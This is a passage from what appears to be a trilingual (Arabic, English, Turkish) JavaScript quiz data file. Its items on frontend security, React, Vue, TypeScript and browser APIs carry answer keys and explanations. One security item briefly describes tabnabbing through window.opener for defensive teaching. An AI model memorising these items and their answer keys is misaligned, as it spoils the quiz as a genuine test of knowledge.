      ar: ['React لا يحمي هنا، يجب تنظيف الـ HTML (مثل DOMPurify) قبل عرضه', 'React ينظّف الـ HTML تلقائيًا', 'آمن لأنه داخل div', 'آمن إذا كان الموقع HTTPS'],
      en: ['React does not protect you here; sanitize the HTML (e.g. DOMPurify) first', 'React sanitizes the HTML automatically', 'Safe because it is inside a div', 'Safe if the site uses HTTPS'],
      tr: ['React burada korumaz; HTML’i önce temizleyin (ör. DOMPurify)', 'React HTML’i otomatik temizler', 'Bir div içinde olduğu için güvenli', 'Site HTTPS kullanıyorsa güvenli'],
    },
    answer: 0,
    why: {
      ar: 'React يحمي من XSS عندما تعرض نصًّا عاديًا لأنه يهرّب الرموز. dangerouslySetInnerHTML (ومثلها v-html في Vue) يتجاوز هذه الحماية عمدًا، والاسم نفسه تحذير.',
      en: 'React protects you when rendering plain text by escaping it. dangerouslySetInnerHTML (like v-html in Vue) skips that protection on purpose; the name itself is the warning.',
      tr: 'React düz metni kaçış karakterleriyle güvenli render eder. dangerouslySetInnerHTML (Vue’daki v-html gibi) bu korumayı bilerek atlar; adı zaten bir uyarıdır.',
    },
  }),
  choice({
    id: 's-sec-noopener', level, topic: 'security',
    code: `<a href="https://other.site" target="_blank" rel="noopener">`, codeLang: 'html',
    prompt: {
      ar: 'ما الذي يمنعه rel="noopener"؟',
      en: 'What does rel="noopener" prevent?',
      tr: 'rel="noopener" neyi engeller?',
    },
    options: {
      ar: ['أن تتحكّم الصفحة الجديدة بصفحتك عبر window.opener', 'تتبّع الزيارات', 'فتح الرابط في تبويب جديد', 'تحميل الصور من الموقع الآخر'],
      en: ['The new page controlling your page through window.opener', 'Visit tracking', 'Opening the link in a new tab', 'Loading images from the other site'],
      tr: ['Yeni sayfanın window.opener üzerinden sayfanızı kontrol etmesini', 'Ziyaret takibini', 'Bağlantının yeni sekmede açılmasını', 'Diğer siteden görsel yüklenmesini'],
    },
    answer: 0,
    why: {
      ar: 'بدونه تستطيع الصفحة المفتوحة كتابة window.opener.location = \'phishing\' فتستبدل صفحتك بصفحة مزيفة (tabnabbing). المتصفحات الحديثة تفترض noopener مع _blank، لكن كتابته صراحة أوضح وأأمن.',
      en: 'Without it, the opened page can run window.opener.location = \'phishing\' and swap your page for a fake one (tabnabbing). Modern browsers assume noopener for _blank, but writing it is clearer and safer.',
      tr: 'Onsuz açılan sayfa window.opener.location = \'phishing\' çalıştırıp sayfanızı sahtesiyle değiştirebilir (tabnabbing). Modern tarayıcılar _blank için noopener varsayar, ama açıkça yazmak daha net ve güvenlidir.',
    },
  }),

  // ───────── React ─────────
  choice({
    id: 's-react-memo-inline-fn', level, topic: 'react',
    code: `const Row = React.memo(function Row({ onSelect }) { /* … */ });

function List() {
  const [query, setQuery] = useState('');
  return <Row onSelect={() => select(1)} />;
}`, codeLang: 'jsx',
    prompt: {
      ar: 'عند تغيّر query في List، هل يُعاد عرض Row؟',
      en: 'When query changes in List, does Row re-render?',
      tr: 'List’te query değişince Row yeniden render olur mu?',
    },
    options: {
      ar: ['نعم، لأن onSelect دالة جديدة في كل عرض', 'لا، لأن Row داخل React.memo', 'لا، لأن Row لا يستخدم query', 'فقط في وضع التطوير'],
      en: ['Yes, because onSelect is a new function on every render', 'No, because Row is wrapped in React.memo', 'No, because Row does not use query', 'Only in development'],
      tr: ['Evet, çünkü onSelect her render’da yeni bir fonksiyondur', 'Hayır, çünkü Row React.memo içinde', 'Hayır, çünkü Row query kullanmıyor', 'Yalnızca geliştirmede'],
    },
    answer: 0,
    why: {
      ar: 'React.memo يقارن الـ props بالمرجع. الدالة السهمية تُنشأ من جديد في كل عرض، فيرى memo أن الـ prop تغيّر. ثبّتها بـ useCallback ليفيد memo فعلًا.',
      en: 'React.memo compares props by reference. The inline arrow is created again on every render, so memo sees a changed prop. Stabilize it with useCallback for memo to help.',
      tr: 'React.memo props’u referansla karşılaştırır. Satır içi ok fonksiyonu her render’da yeniden oluşur ve memo prop’un değiştiğini görür. memo’nun işe yaraması için useCallback ile sabitleyin.',
    },
  }),
  choice({
    id: 's-react-key-reset', level, topic: 'react',
    code: `<EditProfileForm key={userId} userId={userId} />`, codeLang: 'jsx',
    prompt: {
      ar: 'لماذا وُضع key هنا رغم أنه ليس داخل قائمة؟',
      en: 'Why is there a key here even though this is not a list?',
      tr: 'Bu bir liste olmadığı hâlde neden burada key var?',
    },
    options: {
      ar: ['ليعيد React إنشاء المكوّن وتصفير حالته عند تغيّر المستخدم', 'لتحسين الـ SEO', 'لأن React يطلب key لكل مكوّن', 'لتسريع العرض الأول'],
      en: ['So React recreates the component and resets its state when the user changes', 'For SEO', 'Because React requires a key on every component', 'To speed up the first render'],
      tr: ['Kullanıcı değişince React bileşeni yeniden oluştursun ve state’i sıfırlasın diye', 'SEO için', 'Çünkü React her bileşende key ister', 'İlk render’ı hızlandırmak için'],
    },
    answer: 0,
    why: {
      ar: 'عندما يتغيّر الـ key يعتبره React مكوّنًا مختلفًا: يحذف القديم بحالته وينشئ جديدًا. هذه أنظف طريقة لتصفير فورم عند الانتقال لمستخدم آخر بدل useEffect.',
      en: 'When the key changes, React treats it as a different component: it drops the old one with its state and mounts a new one. It is the cleanest way to reset a form for another user, instead of a useEffect.',
      tr: 'key değişince React onu farklı bir bileşen sayar: eskisini state’iyle atar ve yenisini oluşturur. Başka bir kullanıcıya geçerken formu sıfırlamanın useEffect yerine en temiz yoludur.',
    },
  }),
  choice({
    id: 's-react-lazy-state', level, topic: 'react',
    code: `const [rows] = useState(parseHugeCsv(file));       // A
const [rows] = useState(() => parseHugeCsv(file)); // B`, codeLang: 'jsx',
    prompt: {
      ar: 'ما الفرق بين A وB؟',
      en: 'What is the difference between A and B?',
      tr: 'A ile B arasındaki fark nedir?',
    },
    options: {
      ar: ['A يحلّل الملف في كل عرض، وB مرة واحدة فقط', 'لا فرق', 'B يحلّل في كل عرض', 'A غير مسموح في React'],
      en: ['A parses the file on every render, B only once', 'No difference', 'B parses on every render', 'A is not allowed in React'],
      tr: ['A dosyayı her render’da işler, B yalnızca bir kez', 'Fark yok', 'B her render’da işler', 'A React’te izinli değil'],
    },
    answer: 0,
    why: {
      ar: 'في A تُستدعى parseHugeCsv في كل عرض ثم يتجاهل React النتيجة بعد المرة الأولى. في B تمرّر دالة (lazy initializer) يستدعيها React مرة واحدة فقط عند الإنشاء.',
      en: 'In A, parseHugeCsv runs on every render and React ignores the result after the first. In B you pass a function (lazy initializer) that React calls only once, on mount.',
      tr: 'A’da parseHugeCsv her render’da çalışır ve React ilkinden sonra sonucu yok sayar. B’de bir fonksiyon (lazy initializer) verirsiniz, React onu yalnızca bir kez, oluşturulurken çağırır.',
    },
  }),
  choice({
    id: 's-react-effect-cleanup-order', level, topic: 'react',
    code: `useEffect(() => {
  console.log('effect', id);
  return () => console.log('cleanup', id);
}, [id]);

// id changes from 1 to 2`, codeLang: 'jsx',
    prompt: {
      ar: 'ماذا يُطبع عند تغيّر id من 1 إلى 2؟',
      en: 'What is logged when id changes from 1 to 2?',
      tr: 'id 1’den 2’ye değişince ne yazılır?',
    },
    options: ['cleanup 1, effect 2', 'effect 2, cleanup 1', 'cleanup 2, effect 2', 'effect 2'],
    answer: 0,
    why: {
      ar: 'قبل تشغيل الـ effect الجديد، ينظّف React الـ effect السابق بقيمه القديمة (closure على id = 1). لهذا يُلغى الاشتراك أو الطلب القديم قبل بدء الجديد.',
      en: 'Before running the new effect, React cleans up the previous one with its old values (it closed over id = 1). That is how the old subscription or request is cancelled before the new one starts.',
      tr: 'React yeni effect’i çalıştırmadan önce öncekini eski değerleriyle temizler (id = 1’i kapsamıştı). Eski abonelik veya istek, yenisi başlamadan böyle iptal edilir.',
    },
  }),
  choice({
    id: 's-react-batching', level, topic: 'react',
    code: `setTimeout(() => {
  setCount(c => c + 1);
  setFlag(f => !f);
}, 0);`, codeLang: 'jsx',
    prompt: {
      ar: 'في React 18 وما بعده، كم مرة يُعاد عرض المكوّن؟',
      en: 'In React 18 and later, how many times does the component re-render?',
      tr: 'React 18 ve sonrasında bileşen kaç kez yeniden render olur?',
    },
    options: ['1', '2', '0', '3'],
    answer: 0,
    why: {
      ar: 'منذ React 18 يتم تجميع (batching) كل التحديثات تلقائيًا، حتى داخل setTimeout والوعود والأحداث الأصلية، فيُعاد العرض مرة واحدة. قبل 18 كان التجميع داخل أحداث React فقط.',
      en: 'Since React 18, all updates are batched automatically, even inside setTimeout, promises and native events, so there is one re-render. Before 18, batching only happened inside React event handlers.',
      tr: 'React 18’den beri tüm güncellemeler otomatik toplanır (batching), setTimeout, promise ve yerel olaylarda bile; tek bir render olur. 18’den önce yalnızca React olay işleyicilerinde toplanırdı.',
    },
  }),

  // ───────── Vue ─────────
  choice({
    id: 's-vue-watch-deep', level, topic: 'vue',
    code: `const user = ref({ name: 'Ali' })

watch(user, () => console.log('changed'))

user.value.name = 'Omar'`, codeLang: 'js',
    prompt: {
      ar: 'هل يُطبع changed؟',
      en: 'Is "changed" logged?',
      tr: '"changed" yazılır mı?',
    },
    options: {
      ar: ['لا، لأن مراقبة ref تكون سطحية إلا مع deep: true', 'نعم، دائمًا', 'نعم، مرتين', 'خطأ: لا يمكن مراقبة ref'],
      en: ['No: watching a ref is shallow unless you pass deep: true', 'Yes, always', 'Yes, twice', 'Error: a ref cannot be watched'],
      tr: ['Hayır: ref izlemek deep: true verilmedikçe yüzeyseldir', 'Evet, her zaman', 'Evet, iki kez', 'Hata: ref izlenemez'],
    },
    answer: 0,
    why: {
      ar: 'watch على ref يراقب استبدال .value فقط. تعديل خاصية داخلية لا يطلقه إلا مع { deep: true }، أو بمراقبة getter محدد: watch(() => user.value.name, …). أما reactive فمراقبته عميقة تلقائيًا.',
      en: 'watch on a ref only tracks replacing .value. Changing a nested property needs { deep: true }, or watch a specific getter: watch(() => user.value.name, …). A reactive object is watched deeply by default.',
      tr: 'ref üzerindeki watch yalnızca .value’nun değiştirilmesini izler. İç özellik değişikliği { deep: true } ister ya da belirli bir getter izleyin: watch(() => user.value.name, …). reactive nesne varsayılan olarak derin izlenir.',
    },
  }),
  choice({
    id: 's-vue-shallowref', level, topic: 'vue',
    code: `const rows = shallowRef([])

rows.value.push({ id: 1 })   // A
rows.value = [...rows.value] // B`, codeLang: 'js',
    prompt: {
      ar: 'أي سطر يحدّث الواجهة؟',
      en: 'Which line updates the UI?',
      tr: 'Hangi satır arayüzü günceller?',
    },
    options: {
      ar: ['B فقط', 'A فقط', 'الاثنان', 'لا أحد'],
      en: ['Only B', 'Only A', 'Both', 'Neither'],
      tr: ['Yalnızca B', 'Yalnızca A', 'İkisi de', 'Hiçbiri'],
    },
    answer: 0,
    why: {
      ar: 'shallowRef لا يراقب ما بداخل القيمة، بل استبدال .value فقط. هذا مفيد للقوائم الضخمة لأنه يتجنّب تحويل كل عنصر إلى proxy، لكن عليك استبدال القيمة (أو triggerRef) ليتحدّث العرض.',
      en: 'shallowRef does not track what is inside the value, only replacing .value. That helps with huge lists because it avoids turning every item into a proxy, but you must replace the value (or call triggerRef) to update.',
      tr: 'shallowRef değerin içini izlemez, yalnızca .value’nun değiştirilmesini izler. Her öğeyi proxy’ye çevirmediği için büyük listelerde işe yarar, ama güncelleme için değeri değiştirmeniz (veya triggerRef) gerekir.',
    },
  }),
  choice({
    id: 's-vue-prop-mutation', level, topic: 'vue',
    code: `const props = defineProps(['modelValue'])

function clear() {
  props.modelValue = ''
}`, codeLang: 'js',
    prompt: {
      ar: 'ما الطريقة الصحيحة لتغيير القيمة من المكوّن الابن؟',
      en: 'What is the correct way for the child to change the value?',
      tr: 'Çocuk bileşenin değeri değiştirmesinin doğru yolu nedir?',
    },
    options: {
      ar: ['emit(\'update:modelValue\', \'\') ليغيّرها الأب', 'تعديل props مباشرة كما في الكود', 'نسخ props إلى window', 'استخدام this.$parent'],
      en: ['emit(\'update:modelValue\', \'\') so the parent changes it', 'Change props directly as in the code', 'Copy props to window', 'Use this.$parent'],
      tr: ['Ebeveyn değiştirsin diye emit(\'update:modelValue\', \'\')', 'Koddaki gibi props’u doğrudan değiştirin', 'props’u window’a kopyalayın', 'this.$parent kullanın'],
    },
    answer: 0,
    why: {
      ar: 'البيانات في Vue تنزل من الأب للابن في اتجاه واحد. الـ props للقراءة فقط (يظهر تحذير عند تعديلها). الابن يطلب التغيير بـ emit، والأب هو من يعدّل. وفي Vue 3.4+ يسهّل defineModel ذلك.',
      en: 'Data in Vue flows one way, from parent to child. Props are read-only (Vue warns if you change them). The child asks with emit and the parent makes the change. Since Vue 3.4, defineModel makes this easier.',
      tr: 'Vue’da veri tek yönlü, ebeveynden çocuğa akar. Props salt okunurdur (değiştirirseniz Vue uyarır). Çocuk emit ile ister, değişikliği ebeveyn yapar. Vue 3.4’ten beri defineModel bunu kolaylaştırır.',
    },
  }),
  choice({
    id: 's-vue-if-for', level, topic: 'vue',
    code: `<li v-for="todo in todos" v-if="!todo.done">
  {{ todo.title }}
</li>`, codeLang: 'vue',
    prompt: {
      ar: 'ماذا يحدث في Vue 3؟',
      en: 'What happens in Vue 3?',
      tr: 'Vue 3’te ne olur?',
    },
    options: {
      ar: ['v-if يُنفَّذ قبل v-for فلا يعرف todo، ويظهر خطأ', 'تظهر المهام غير المنجزة فقط', 'تظهر كل المهام', 'v-for يُتجاهل'],
      en: ['v-if runs before v-for, so todo is undefined and it errors', 'Only unfinished todos are shown', 'All todos are shown', 'v-for is ignored'],
      tr: ['v-if, v-for’dan önce çalışır; todo tanımsızdır ve hata verir', 'Yalnızca bitmemiş görevler gösterilir', 'Tüm görevler gösterilir', 'v-for yok sayılır'],
    },
    answer: 0,
    why: {
      ar: 'في Vue 3 تغيّرت الأولوية: v-if أعلى من v-for على نفس العنصر (وكان العكس في Vue 2). ضع v-for على <template> وv-if بداخله، أو الأفضل: صفِّ القائمة في computed.',
      en: 'Vue 3 changed the priority: v-if now runs before v-for on the same element (it was the other way in Vue 2). Put v-for on a <template> with v-if inside, or better, filter the list in a computed.',
      tr: 'Vue 3 önceliği değiştirdi: aynı öğede v-if artık v-for’dan önce çalışır (Vue 2’de tersiydi). v-for’u bir <template>’e koyup v-if’i içine yazın ya da daha iyisi listeyi bir computed’da filtreleyin.',
    },
  }),

  // ───────── TypeScript ─────────
  choice({
    id: 's-ts-keyof', level, topic: 'typescript',
    code: `function get<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key];
}

const user = { id: 1, name: 'Ali' };
const a = get(user, 'name');
const b = get(user, 'email');`, codeLang: 'ts',
    prompt: {
      ar: 'ماذا يقول TypeScript عن a وb؟',
      en: 'What does TypeScript say about a and b?',
      tr: 'TypeScript a ve b hakkında ne der?',
    },
    options: {
      ar: ['a نوعها string، وb خطأ عند الترجمة', 'الاثنان any', 'a نوعها string | number، وb نوعها undefined', 'لا أخطاء'],
      en: ['a is string, and b is a compile error', 'Both are any', 'a is string | number, b is undefined', 'No errors'],
      tr: ['a string’dir, b derleme hatasıdır', 'İkisi de any', 'a string | number, b undefined', 'Hata yok'],
    },
    answer: 0,
    why: {
      ar: 'K extends keyof T يحصر المفتاح في مفاتيح الكائن الفعلية، وT[K] يعطي نوع تلك الخاصية بالضبط. "email" ليس من مفاتيح user فيُرفض قبل التشغيل.',
      en: 'K extends keyof T limits the key to the object’s real keys, and T[K] gives that exact property type. "email" is not a key of user, so it is rejected before running.',
      tr: 'K extends keyof T anahtarı nesnenin gerçek anahtarlarıyla sınırlar, T[K] o özelliğin tam tipini verir. "email" user’ın anahtarı değildir, çalışmadan önce reddedilir.',
    },
  }),
  choice({
    id: 's-ts-exhaustive', level, topic: 'typescript',
    code: `type Shape = { kind: 'circle'; r: number } | { kind: 'square'; size: number };

function area(s: Shape) {
  switch (s.kind) {
    case 'circle': return Math.PI * s.r ** 2;
    case 'square': return s.size ** 2;
    default:
      const check: never = s;
      return check;
  }
}`, codeLang: 'ts',
    prompt: {
      ar: 'ما فائدة سطر const check: never = s؟',
      en: 'What is const check: never = s for?',
      tr: 'const check: never = s satırı ne işe yarar?',
    },
    options: {
      ar: ['إذا أضفت شكلًا جديدًا للـ union ونسيت حالته، يظهر خطأ عند الترجمة', 'يسرّع switch', 'يمنع الأخطاء عند التشغيل في كل الحالات', 'لا فائدة منه'],
      en: ['If you add a new shape to the union and forget its case, you get a compile error', 'It speeds up the switch', 'It prevents all runtime errors', 'It does nothing'],
      tr: ['Union’a yeni bir şekil ekleyip case’ini unutursanız derleme hatası alırsınız', 'switch’i hızlandırır', 'Tüm çalışma zamanı hatalarını önler', 'Hiçbir şey yapmaz'],
    },
    answer: 0,
    why: {
      ar: 'في default يُضيِّق TypeScript نوع s حتى لا يبقى شيء (never). لو أضفت { kind: \'triangle\' } دون case، يصبح s من نوع triangle فلا يمكن إسناده إلى never ويظهر الخطأ فورًا.',
      en: 'In default, TypeScript narrows s until nothing is left (never). If you add { kind: \'triangle\' } without a case, s becomes the triangle type, which cannot be assigned to never, and you get an error right away.',
      tr: 'default’ta TypeScript s’yi hiçbir şey kalmayana (never) kadar daraltır. case eklemeden { kind: \'triangle\' } eklerseniz s triangle tipine dönüşür, never’a atanamaz ve hemen hata alırsınız.',
    },
  }),
  choice({
    id: 's-ts-excess-property', level, topic: 'typescript',
    code: `interface Point { x: number; y: number }

const a: Point = { x: 1, y: 2, z: 3 };   // A

const raw = { x: 1, y: 2, z: 3 };
const b: Point = raw;                     // B`, codeLang: 'ts',
    prompt: {
      ar: 'أي سطر يعطي خطأ؟',
      en: 'Which line is an error?',
      tr: 'Hangi satır hatalıdır?',
    },
    options: {
      ar: ['A فقط', 'B فقط', 'الاثنان', 'لا أحد'],
      en: ['Only A', 'Only B', 'Both', 'Neither'],
      tr: ['Yalnızca A', 'Yalnızca B', 'İkisi de', 'Hiçbiri'],
    },
    answer: 0,
    why: {
      ar: 'TypeScript يعتمد على الشكل (structural typing): raw فيه x وy فهو يناسب Point. لكن عند كتابة كائن جديد مباشرة يطبّق "فحص الخصائص الزائدة" ليكتشف الأخطاء الإملائية، فيرفض z في A فقط.',
      en: 'TypeScript is structural: raw has x and y, so it fits Point. But for a fresh object literal it runs an "excess property check" to catch typos, so only A is rejected for z.',
      tr: 'TypeScript yapısaldır: raw’da x ve y var, Point’e uyar. Ama doğrudan yazılan yeni bir nesnede yazım hatalarını yakalamak için "fazla özellik kontrolü" yapar; z yüzünden yalnızca A reddedilir.',
    },
  }),
  choice({
    id: 's-ts-satisfies', level, topic: 'typescript',
    code: `type Routes = Record<string, string>;

const routes = {
  home: '/',
  about: '/about',
} satisfies Routes;

routes.contact;`, codeLang: 'ts',
    prompt: {
      ar: 'لماذا satisfies هنا أفضل من كتابة const routes: Routes؟',
      en: 'Why is satisfies better here than writing const routes: Routes?',
      tr: 'Burada satisfies neden const routes: Routes yazmaktan daha iyidir?',
    },
    options: {
      ar: ['يتحقق من النوع ويحتفظ بالمفاتيح الحقيقية، فيكتشف أن contact غير موجود', 'يحوّل القيم إلى readonly', 'يعمل عند التشغيل', 'لا فرق بينهما'],
      en: ['It checks the type but keeps the real keys, so it catches that contact does not exist', 'It makes the values readonly', 'It works at runtime', 'There is no difference'],
      tr: ['Tipi kontrol eder ama gerçek anahtarları korur; contact’ın olmadığını yakalar', 'Değerleri readonly yapar', 'Çalışma zamanında çalışır', 'Fark yoktur'],
    },
    answer: 0,
    why: {
      ar: 'مع : Routes يصبح النوع Record<string, string>، فأي مفتاح مثل contact مقبول. satisfies يتأكد أن الكائن يطابق Routes لكن يُبقي النوع المستنتج الدقيق (home وabout فقط).',
      en: 'With : Routes the type becomes Record<string, string>, so any key like contact is allowed. satisfies checks that the object matches Routes but keeps the precise inferred type (only home and about).',
      tr: ': Routes ile tip Record<string, string> olur ve contact gibi her anahtar kabul edilir. satisfies nesnenin Routes’a uyduğunu kontrol eder ama kesin çıkarılan tipi korur (yalnızca home ve about).',
    },
  }),

  // ───────── Browser ─────────
  choice({
    id: 's-cache-no-cache', level, topic: 'browser',
    prompt: {
      ar: 'ماذا يعني Cache-Control: no-cache؟',
      en: 'What does Cache-Control: no-cache mean?',
      tr: 'Cache-Control: no-cache ne anlama gelir?',
    },
    options: {
      ar: ['يمكن التخزين، لكن يجب التحقق من السيرفر قبل كل استخدام', 'ممنوع التخزين نهائيًا', 'خزّن لمدة سنة', 'لا يُخزَّن إلا في الـ CDN'],
      en: ['It may be stored, but must be revalidated with the server before each use', 'Never store it at all', 'Store it for a year', 'Store it only in the CDN'],
      tr: ['Saklanabilir ama her kullanımdan önce sunucuyla doğrulanmalıdır', 'Asla saklanmaz', 'Bir yıl saklanır', 'Yalnızca CDN’de saklanır'],
    },
    answer: 0,
    why: {
      ar: 'الاسم مضلِّل: no-cache يعني "تحقّق أولًا" (مثلًا عبر ETag فيرد السيرفر 304 بدون إعادة الملف). المنع الكامل هو no-store. ولملفات تحمل hash في اسمها استخدم max-age طويل مع immutable.',
      en: 'The name is misleading: no-cache means "check first" (for example with an ETag, so the server answers 304 without resending). Never storing is no-store. For files with a hash in their name, use a long max-age with immutable.',
      tr: 'Adı yanıltıcıdır: no-cache "önce kontrol et" demektir (ör. ETag ile; sunucu dosyayı yeniden göndermeden 304 döner). Hiç saklamamak no-store’dur. Adında hash olan dosyalar için uzun max-age ve immutable kullanın.',
    },
  }),
  choice({
    id: 's-intersection-observer', level, topic: 'browser',
    prompt: {
      ar: 'تريد تحميل المزيد من المنشورات عندما يقترب المستخدم من نهاية القائمة. ما الأفضل؟',
      en: 'You want to load more posts when the user nears the end of the list. What is best?',
      tr: 'Kullanıcı listenin sonuna yaklaşınca daha fazla gönderi yüklemek istiyorsunuz. En iyisi nedir?',
    },
    options: {
      ar: ['IntersectionObserver على عنصر في آخر القائمة', 'حساب getBoundingClientRect في كل scroll', 'setInterval يفحص موضع التمرير كل 10ms', 'تحميل كل المنشورات من البداية'],
      en: ['An IntersectionObserver on an element at the end of the list', 'Calling getBoundingClientRect on every scroll', 'A setInterval that checks scroll position every 10ms', 'Loading all posts up front'],
      tr: ['Listenin sonundaki bir öğede IntersectionObserver', 'Her scroll’da getBoundingClientRect çağırmak', 'Her 10ms’de kaydırma konumunu kontrol eden setInterval', 'Tüm gönderileri baştan yüklemek'],
    },
    answer: 0,
    why: {
      ar: 'IntersectionObserver يترك المتصفح يراقب ظهور العنصر بكفاءة ويبلغك فقط عند التغيّر، دون كود يعمل مع كل حركة تمرير ودون إجبار على حساب الـ Layout.',
      en: 'IntersectionObserver lets the browser track visibility efficiently and only calls you when it changes, with no code on every scroll and no forced layout.',
      tr: 'IntersectionObserver görünürlüğü tarayıcının verimli takip etmesini sağlar ve yalnızca değişince sizi çağırır; her kaydırmada kod çalışmaz, layout zorlanmaz.',
    },
  }),
  choice({
    id: 's-raf-background', level, topic: 'browser',
    prompt: {
      ar: 'ماذا يحدث لـ requestAnimationFrame عندما يكون التبويب في الخلفية؟',
      en: 'What happens to requestAnimationFrame when the tab is in the background?',
      tr: 'Sekme arka plandayken requestAnimationFrame’e ne olur?',
    },
    options: {
      ar: ['يتوقف (أو يتباطأ جدًا) حتى يعود التبويب', 'يستمر 60 مرة في الثانية', 'يتحوّل إلى setTimeout(0)', 'يرمي خطأ'],
      en: ['It pauses (or slows a lot) until the tab is visible again', 'It keeps running 60 times a second', 'It turns into setTimeout(0)', 'It throws an error'],
      tr: ['Sekme tekrar görünene kadar durur (veya çok yavaşlar)', 'Saniyede 60 kez çalışmaya devam eder', 'setTimeout(0)’a dönüşür', 'Hata fırlatır'],
    },
    answer: 0,
    why: {
      ar: 'المتصفح يوقف rAF في التبويبات المخفية لتوفير البطارية. لذلك لا تعتمد عليه لحساب الوقت الحقيقي: احسب الفرق من performance.now() بدل عدّ الإطارات.',
      en: 'Browsers pause rAF in hidden tabs to save battery. So do not rely on it to measure real time: compute the difference with performance.now() instead of counting frames.',
      tr: 'Tarayıcılar pil tasarrufu için gizli sekmelerde rAF’yi durdurur. Gerçek zamanı ölçmek için ona güvenmeyin: kare saymak yerine performance.now() ile farkı hesaplayın.',
    },
  }),
  choice({
    id: 's-web-worker-dom', level, topic: 'browser',
    prompt: {
      ar: 'ما الذي لا يستطيع Web Worker فعله؟',
      en: 'What can a Web Worker not do?',
      tr: 'Bir Web Worker neyi yapamaz?',
    },
    options: {
      ar: ['الوصول المباشر إلى الـ DOM', 'استخدام fetch', 'إرسال رسائل بـ postMessage', 'تنفيذ حسابات ثقيلة'],
      en: ['Access the DOM directly', 'Use fetch', 'Send messages with postMessage', 'Run heavy computations'],
      tr: ['DOM’a doğrudan erişmek', 'fetch kullanmak', 'postMessage ile mesaj göndermek', 'Ağır hesaplamalar yapmak'],
    },
    answer: 0,
    why: {
      ar: 'الـ Worker يعمل على خيط منفصل بلا window ولا document. يحسب ويرسل النتيجة بـ postMessage، والخيط الرئيسي هو من يحدّث الـ DOM.',
      en: 'A Worker runs on a separate thread with no window or document. It computes and sends the result with postMessage, and the main thread updates the DOM.',
      tr: 'Worker, window ve document olmadan ayrı bir iş parçacığında çalışır. Hesaplar ve sonucu postMessage ile gönderir; DOM’u ana iş parçacığı günceller.',
    },
  }),
]
